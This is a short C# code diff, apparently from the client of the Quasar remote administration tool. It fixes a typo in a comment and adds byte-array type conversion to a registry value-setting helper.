@@ -2,6 +2,7 @@
 using Microsoft.Win32;
 using System.Linq;
 using System;
+using Quasar.Common.Utilities;
 
 namespace xClient.Core.Extensions
 {
@@ -233,11 +234,31 @@ namespace xClient.Core.Extensions
         /// <param name="name">The name of the value.</param>
         /// <param name="data">The data of the value</param>
         /// <param name="kind">The value kind of the value</param>
-        /// <returns>Returns a boolean value if the action succeded or failed.</returns>
+        /// <returns>Returns a boolean value if the action succeeded or failed.</returns>
         public static bool SetValueSafe(this RegistryKey key, string name, object data, RegistryValueKind kind)
         {
             try
             {
+                // handle type conversion
+                if (kind != RegistryValueKind.Binary && data.GetType() == typeof(byte[]))
+                {
+                    switch (kind)
+                    {
+                        case RegistryValueKind.String:
+                        case RegistryValueKind.ExpandString:
+                            data = ByteConverter.ToString((byte[]) data);
+                            break;
+                        case RegistryValueKind.DWord:
+                            data = ByteConverter.ToUInt32((byte[]) data);
+                            break;
+                        case RegistryValueKind.QWord:
+                            data = ByteConverter.ToUInt64((byte[]) data);
+                            break;
+                        case RegistryValueKind.MultiString:
+                            data = ByteConverter.ToStringArray((byte[]) data);
+                            break;
+                    }
+                }
                 key.SetValue(name, data, kind);
                 return true;
             }
